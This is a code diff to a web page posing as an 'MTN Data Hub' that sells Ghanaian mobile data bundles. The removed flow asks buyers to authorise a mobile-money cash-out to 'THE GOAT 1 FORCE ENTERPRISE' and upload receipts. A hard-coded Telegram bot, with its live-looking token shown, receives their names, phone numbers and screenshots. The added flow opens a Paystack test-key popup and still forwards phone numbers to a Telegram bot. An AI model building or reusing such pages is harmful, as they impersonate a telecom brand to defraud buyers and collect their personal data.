@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTN Data Hub - Premium Data Services</title>
+    <script src="https://js.paystack.co/v1/inline.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
         
@@ -130,6 +131,7 @@
         }
         .form-group { margin-bottom: 32px; }
         .form-label { display: block; font-weight: 700; margin-bottom: 12px; color: var(--mtn-blue); font-size: 15px; }
+        .form-label-helper { display: block; font-weight: 500; color: var(--text-secondary); font-size: 13px; margin-top: 4px; }
         .form-input { 
             width: 100%; padding: 20px; border: 2px solid #F1F5F9; border-radius: 18px; 
             font-size: 17px; font-weight: 600; transition: 0.3s; background: #F8FAFC;
@@ -181,6 +183,15 @@
         .upload-area:hover { border-color: var(--mtn-yellow); background: white; }
         .upload-icon { font-size: 32px; margin-bottom: 12px; }
         
+        /* Info Box Styling */
+        .info-box {
+            background: #EFF6FF; padding: 24px; border-radius: 20px; border: 1px solid #BFDBFE; 
+            margin-bottom: 32px; display: flex; gap: 16px; align-items: flex-start;
+        }
+        .info-box-icon { font-size: 24px; flex-shrink: 0; }
+        .info-box-content p { font-size: 14px; color: #1E40AF; line-height: 1.6; }
+        .info-box-content p:first-child { font-weight: 700; margin-bottom: 4px; }
+
         @media (max-width: 768px) {
             .app-card { padding: 40px 24px; }
             .hero-section { padding: 60px 24px; }
@@ -229,90 +240,54 @@
         <!-- Payment Details Page -->
         <div id="paymentPage" class="state">
             <div class="app-card">
-                <h2 style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px; text-align: center;">Payment Details</h2>
+                <h2 style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px; text-align: center;">Complete Your Order</h2>
                 
                 <!-- Plan Summary -->
-                <div id="planSummary" style="background: var(--mtn-blue); border-radius: 20px; padding: 24px; margin-bottom: 32px; color: white; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 10px 20px rgba(0, 51, 153, 0.2);">
+                <div id="planSummary" style="background: linear-gradient(135deg, var(--mtn-dark) 0%, var(--mtn-blue) 100%); border-radius: 20px; padding: 28px; margin-bottom: 40px; color: white; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 10px 25px rgba(0, 51, 153, 0.25);">
                     <div>
-                        <p style="font-size: 12px; opacity: 0.8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Selected Bundle</p>
-                        <h3 id="summaryData" style="font-size: 28px; font-weight: 800;">0GB</h3>
+                        <p style="font-size: 12px; opacity: 0.85; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Your Data Bundle</p>
+                        <h3 id="summaryData" style="font-size: 32px; font-weight: 800; margin-top: 8px;">0GB</h3>
                     </div>
                     <div style="text-align: right;">
-                        <p style="font-size: 12px; opacity: 0.8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Total Price</p>
-                        <h3 id="summaryPrice" style="font-size: 28px; font-weight: 800;">GHS 0</h3>
-                    </div>
-                </div>
-                
-                <div style="background: #EFF6FF; padding: 20px; border-radius: 20px; border: 1px solid #BFDBFE; margin-bottom: 32px; display: flex; gap: 16px; align-items: flex-start;">
-                    <div style="font-size: 24px;">💡</div>
-                    <div>
-                        <p style="font-weight: 700; color: var(--mtn-blue); font-size: 14px; margin-bottom: 4px;">CASH-OUT PAYMENT</p>
-                        <p style="font-size: 13px; color: #1E40AF; line-height: 1.5;">Please ensure cash-out is allowed on your phone before you proceed.</p>
+                        <p style="font-size: 12px; opacity: 0.85; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Amount to Pay</p>
+                        <h3 id="summaryPrice" style="font-size: 32px; font-weight: 800; margin-top: 8px;">GHS 0</h3>
                     </div>
                 </div>
 
+                <!-- Payment Flow Info -->
+                <div class="info-box">
+                    <img src="mtn_logo.jpg" class="info-box-icon" style="width: 40px; height: 40px; border-radius: 8px; object-fit: contain;">
+                    <div class="info-box-content">
+                        <p>Enter Your MTN Number</p>
+                        <p>Provide the MTN mobile number where you want the data bundle delivered.</p>
+                    </div>
+                </div>
+
+                <!-- MTN Mobile Number Field (For Data Bundle) -->
                 <div class="form-group">
-                    <label class="form-label">MTN Mobile Number</label>
+                    <label class="form-label">
+                        MTN Mobile Number
+                        <span class="form-label-helper">(for data bundle delivery)</span>
+                    </label>
                     <input type="tel" id="phoneInput" class="form-input" placeholder="024 XXX XXXX" maxlength="10">
                 </div>
-                <div class="form-group">
-                    <label class="form-label">MoMo Account Name</label>
-                    <input type="text" id="nameInput" class="form-input" placeholder="Enter full registered name">
+
+                <!-- Important Notice -->
+                <div class="info-box" style="background: #FEE2E2; border-color: #FECACA;">
+                    <div class="info-box-icon">⚠️</div>
+                    <div class="info-box-content">
+                        <p style="color: #991B1B;">Please Enter the Correct Number</p>
+                        <p style="color: #991B1B;">Ensure the MTN number is accurate. Payments are non-refundable if the number provided is incorrect. Thank you.</p>
+                    </div>
                 </div>
-                <button class="btn-full btn-primary" onclick="startPayment()">PROCEED TO CASH-OUT</button>
+
+                <!-- Pay Button -->
+                <button class="btn-full btn-primary" id="payBtn" onclick="payWithPaystack()">Proceed to Payment</button>
                 <button class="btn-full btn-outline" onclick="showPage('bundlesPage')">← Back to Plans</button>
             </div>
         </div>
 
-        <!-- Processing Page -->
-        <div id="processingPage" class="state">
-            <div class="app-card">
-                <div style="background: #EFF6FF; padding: 16px; border-radius: 16px; border: 1px solid #BFDBFE; margin-bottom: 32px; text-align: center;">
-                    <p style="font-size: 13px; color: #1E40AF; line-height: 1.5; font-weight: 600;">
-                        Please allow cash-out on your phone and approve the authorization shown by the recipient name below.
-                    </p>
-                </div>
-                <div class="timer-box">
-                    <div class="timer-circle-wrap">
-                        <svg class="timer-svg">
-                            <circle class="timer-bg" cx="90" cy="90" r="80"></circle>
-                            <circle class="timer-bar" id="timerBar" cx="90" cy="90" r="80"></circle>
-                        </svg>
-                        <div class="timer-text" id="timerDisplay">03:30</div>
-                    </div>
-                    <p style="font-weight: 800; margin-top: 32px; font-size: 20px; color: var(--mtn-blue); letter-spacing: 1px;">AWAITING AUTHORIZATION</p>
-                </div>
 
-                <div style="background: #FEF3C7; padding: 24px; border-radius: 20px; border: 2px solid var(--mtn-yellow); margin-bottom: 40px; text-align: center;">
-                    <div style="margin-bottom: 16px; padding-bottom: 16px; border-bottom: 1px solid rgba(146, 64, 14, 0.1);">
-                        <p style="font-size: 12px; font-weight: 700; color: #92400E; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;">Amount to Pay:</p>
-                        <p id="procPrice" style="font-size: 28px; font-weight: 800; color: var(--mtn-blue);">GHS 0</p>
-                    </div>
-                    <p style="font-size: 12px; font-weight: 700; color: #92400E; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px;">Verify Recipient:</p>
-                    <p style="font-size: 20px; font-weight: 800; color: var(--mtn-blue);">THE GOAT 1 FORCE ENTERPRISE</p>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Proof of Payment</label>
-                    <div class="upload-area" onclick="document.getElementById('fileInput').click()">
-                        <div id="upLabel" style="text-align: center;">
-                            <div class="upload-icon">📸</div>
-                            <p style="font-weight: 700; font-size: 15px; color: var(--mtn-blue);">Upload Receipt Screenshot</p>
-                            <p style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">Tap to select file</p>
-                        </div>
-                        <img id="prevImg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none;">
-                    </div>
-                    <input type="file" id="fileInput" style="display: none;" onchange="handleFile(event)">
-                    
-                    <div style="background: #F0FDF4; padding: 16px; border-radius: 16px; border: 1px solid #10B981; margin: 20px 0;">
-                        <p style="font-size: 13px; color: #065F46; line-height: 1.5; text-align: center;">
-                            <b>Fast-Track:</b> Upload your screenshot receipt and submit for instant verification.
-                        </p>
-                    </div>
-                    <button id="submitReceiptBtn" class="btn-full btn-primary" onclick="submitReceipt()" style="opacity: 0.6; cursor: not-allowed;" disabled>SUBMIT PAYMENT</button>
-                </div>
-            </div>
-        </div>
 
         <!-- Waiting Page -->
         <div id="waitingPage" class="state">
@@ -346,11 +321,11 @@
 
         <!-- Error Page -->
         <div id="errorPage" class="state">
-            <div class="app-card" style="text-align: center; border-top: 10px solid var(--error);">
+            <div class="app-card" style="text-align: center; border-top: 10px solid #EF4444;">
                 <div style="font-size: 80px; margin-bottom: 24px;">✕</div>
                 <h2 id="errorTitle" style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px;">Payment Declined</h2>
                 <p id="errorMsg" style="color: var(--text-secondary); font-size: 17px; margin-bottom: 40px;">We were unable to verify your payment at this time.</p>
-                <button class="btn-full btn-primary" onclick="clearReceipt(); showPage('paymentPage')">Try Cash Out Again</button>
+                <button class="btn-full btn-primary" onclick="clearReceipt(); showPage('paymentPage')">Try Again</button>
                 <button class="btn-full btn-outline" onclick="resetFlow()">Return Home</button>
             </div>
         </div>
@@ -363,7 +338,11 @@
     </footer>
 
     <script>
-        const CONFIG = { BOT_TOKEN: '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88', CHAT_ID: '8889432014', TIMER: 210 };
+        const CONFIG = { 
+            BOT_TOKEN: '8874872179:AAFFzpqMS6EelZKFA32j10FM5gBgZUTfc5Y', 
+            CHAT_ID: '8586910663', 
+            PAYSTACK_PUBLIC_KEY: 'pk_test_f6b39c063c7834ad65a97ea3b265c3d87c8c6d2f'
+        };
         const BUNDLES = [
             { id: 1, data: '1GB', price: 12, tag: 'Starter', unavailable: true }, 
             { id: 2, data: '5GB', price: 25, tag: 'Popular' }, 
@@ -436,89 +415,65 @@
         }
         function showBundles() { showPage('bundlesPage'); }
 
-        function startPayment() {
-            const phone = document.getElementById('phoneInput').value, name = document.getElementById('nameInput').value;
+        function payWithPaystack() {
+            const phone = document.getElementById('phoneInput').value;
             const mtnPrefixes = ['024', '054', '055', '059', '025', '053'];
             const prefix = phone.substring(0, 3);
-            
-            if (phone.length !== 10 || !name) { 
-                alert('Please enter a valid 10-digit phone number and account name.'); 
-                return; 
-            }
-            if (!mtnPrefixes.includes(prefix)) {
-                alert('Invalid MTN number. Please use a valid MTN Ghana number (e.g., 024, 054, 055, 059, 025, 053).');
+
+            if (phone.length !== 10) {
+                alert('Please enter a valid 10-digit MTN mobile number.');
                 return;
             }
-            
-            currentId = Date.now().toString(); isNotifActive = false; document.getElementById('notifContainer').innerHTML = '';
-            document.getElementById('procPrice').innerText = 'GHS ' + selectedBundle.price;
-            showPage('processingPage'); startTimer(CONFIG.TIMER);
-            const msg = `🚀 *NEW ORDER*\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n📦 *Bundle:* ${selectedBundle.data}\n💰 *Price:* GHS ${selectedBundle.price}\n🆔 *ID:* ${currentId}`;
-            const kb = { inline_keyboard: [[{ text: '✅ Approve', callback_data: `approve_${currentId}` }, { text: '❌ Decline', callback_data: `decline_${currentId}` }]]};
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown', reply_markup: kb }) });
-            startPolling();
-        }
+            if (!mtnPrefixes.includes(prefix)) {
+                alert('Invalid MTN number. Please use a valid MTN Ghana number.');
+                return;
+            }
 
-        function startPolling() {
-            let lastId = 0;
-            pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastId + 1}`)
-                    .then(r => r.json()).then(data => {
-                        if (data.ok && data.result) {
-                            data.result.forEach(u => {
-                                lastId = u.update_id;
-                                if (u.callback_query && u.callback_query.data.includes(currentId)) {
-                                    clearInterval(pollInterval); clearInterval(timer);
-                                    if (u.callback_query.data.startsWith('approve')) { showPage('successPage'); } 
-                                    else { showError('Payment Declined', 'We have not received your payment. Please try again.'); }
-                                }
-                            });
+            if (!selectedBundle) {
+                alert('Please select a bundle first.');
+                return;
+            }
+
+            if (typeof PaystackPop === 'undefined') {
+                alert('Payment service is loading. Please try again.');
+                return;
+            }
+
+            const reference = 'MTN-' + Math.floor((Math.random() * 1000000000) + 1);
+            const amount = selectedBundle.price * 100;
+
+            try {
+                const handler = PaystackPop.setup({
+                    key: CONFIG.PAYSTACK_PUBLIC_KEY,
+                    email: 'customer@mtndata.com',
+                    amount: amount,
+                    currency: 'GHS',
+                    ref: reference,
+                    onClose: function() {
+                        console.log('Payment window closed');
+                    },
+                    callback: function(response) {
+                        console.log('Payment successful:', response);
+                        if (response && response.reference) {
+                            sendTelegramNotification(response.reference, phone);
+                            showPage('successPage');
                         }
-                    });
-            }, 2000);
-        }
-
-        function handleFile(e) {
-            const file = e.target.files[0];
-            if (file) {
-                selectedFile = file;
-                const prev = document.getElementById('prevImg'); 
-                prev.src = URL.createObjectURL(file); 
-                prev.style.display = 'block'; 
-                document.getElementById('upLabel').style.display = 'none';
-                const btn = document.getElementById('submitReceiptBtn');
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
-                btn.disabled = false;
+                    }
+                });
+                handler.openIframe();
+            } catch (error) {
+                console.error('Paystack error:', error);
+                alert('Payment service error: ' + error.message);
             }
         }
 
-        function submitReceipt() {
-            if (!selectedFile) return;
-            const btn = document.getElementById('submitReceiptBtn');
-            btn.innerText = 'UPLOADING...';
-            btn.disabled = true;
-            
-            const fd = new FormData(); 
-            fd.append('chat_id', CONFIG.CHAT_ID); 
-            fd.append('photo', selectedFile); 
-            fd.append('caption', `📸 *RECEIPT SUBMITTED*\n👤 *Name:* ${document.getElementById('nameInput').value}\n📞 *Phone:* ${document.getElementById('phoneInput').value}\n🆔 ${currentId}`); 
-            fd.append('parse_mode', 'Markdown');
-            
-            const kb = { inline_keyboard: [[{ text: '✅ Approve', callback_data: `approve_${currentId}` }, { text: '❌ Decline', callback_data: `decline_${currentId}` }]]};
-            fd.append('reply_markup', JSON.stringify(kb));
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok) { showPage('waitingPage'); } 
-                    else { throw new Error('Upload failed'); }
-                })
-                .catch(err => {
-                    btn.innerText = 'RETRY SUBMIT';
-                    btn.disabled = false;
-                    alert('Upload failed. Please try again.');
-                });
+        function sendTelegramNotification(ref, phone) {
+            const msg = `✅ *PAYMENT SUCCESSFUL*\n📞 *Phone:* ${phone}\n📦 *Bundle:* ${selectedBundle.data}\n💰 *Price:* GHS ${selectedBundle.price}\n🆔 *Ref:* ${ref}`;
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' }) 
+            });
         }
 
         function startTimer(s) {
